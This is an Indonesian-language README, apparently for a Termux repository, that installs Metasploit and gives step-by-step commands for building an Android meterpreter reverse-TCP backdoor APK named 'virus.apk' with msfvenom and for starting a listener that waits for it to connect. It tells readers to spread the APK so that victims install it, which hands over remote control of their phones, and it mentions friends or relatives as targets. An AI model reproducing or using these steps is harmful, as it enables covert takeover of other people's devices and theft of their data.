# MspoitZonaredXXII
By. Mr.HRC303





INSTALL & KERJA METASPLOIT :
$ pkg update && pkg upgrade
$ pkg install bundler
$ pkg install wget
$ pkg install ruby
$ pkg install git
$ git clone https://github.com/HRC303/M-SploitXXII.git
$ cd M-SploitXXII
$ chmod +x M-SploitXXII.sh
$ ./M-SploitXXII.sh
$ msfconsole

CARA KERJANYA :
1. Pertama kita akan membuat payload/backdoor atau virus yang kita gunakan untuk dirimkan ke korban agar dapat akses ke HP nya.
Silahkan ketik: 
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP Kamu LPORT=8080 -o /sdcard/virus.apk

2. Cara mengetahui IP address kita ketik : ifconfig

> msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
> set lhost IP KAMU
> set lport 8080
> run
setelah itu,kita sebarkan payload yang sudah kita buat diawal tadi,agar diinstal di hp korban,anda juga bisa mencoba pada teman, saudara atau di hp sendiri.

jika ada korban yang menginstal dan menjalankan virus tersebut,kita sudah dapat mengendalikan hp korban dengan perintah-perintah yang terdapat pada Metasploit

Untuk mengetahui perintah yang dapat kita gunakan ketik help.
